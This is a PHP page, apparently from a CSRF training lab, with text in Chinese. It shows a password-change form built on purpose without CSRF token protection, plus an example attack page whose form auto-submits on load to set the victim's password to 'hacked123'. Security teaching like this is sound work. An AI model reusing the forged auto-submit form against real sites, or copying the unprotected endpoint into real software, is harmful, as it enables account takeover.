<?php
// 基础CSRF - 修改密码
$msg = null;
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['newpass'])) {
    $newpass = $_POST['newpass'];
    $msg = '<span style="color:var(--accent);">密码已修改为：' . h($newpass) . '</span>';
}
?>

<p>修改密码功能（无CSRF防护）</p>
<p>该接口没有任何CSRF Token验证，攻击者可以构造恶意页面诱导用户点击。</p>

<form method="POST">
    <label>新密码</label>
    <input type="text" name="newpass" placeholder="输入新密码" value="newpassword123">
    <button type="submit" class="btn btn-primary">修改密码</button>
</form>

<?php if ($msg): ?>
    <div class="result-box"><?= $msg ?></div>
<?php endif; ?>

<div style="margin-top:1.5rem; padding:1rem; background:var(--bg-secondary); border-radius:var(--radius-sm); font-size:0.8rem;">
    <strong style="color:var(--warning);">CSRF攻击示例：</strong>
    <br>创建一个HTML文件，内容如下：
    <pre style="color:var(--text-muted); margin-top:0.5rem;">&lt;html&gt;
&lt;body onload="document.getElementById('f').submit()"&gt;
&lt;form id="f" action="目标URL" method="POST"&gt;
  &lt;input name="newpass" value="hacked123"&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>
</div>
